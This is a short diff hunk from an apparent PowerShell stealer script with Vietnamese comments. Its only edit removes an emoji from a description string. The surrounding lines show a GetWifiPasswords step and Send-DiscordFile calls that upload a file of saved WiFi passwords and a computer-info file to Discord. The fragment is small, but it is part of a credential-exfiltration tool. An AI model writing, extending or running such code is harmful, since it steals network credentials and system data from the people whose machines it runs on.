@@ -124,7 +124,7 @@ GetWifiPasswords
 # ==========================================
 
 # Gửi WiFi passwords
-Send-DiscordFile -FilePath "$destDir\WiFi_Details.txt" -Description "📡 WiFi Passwords"
+Send-DiscordFile -FilePath "$destDir\WiFi_Details.txt" -Description "WiFi Passwords"
 
 # Gửi System Info
 Send-DiscordFile -FilePath "$destDir\SystemInfo\computer_info.txt" -Description "Computer Info"
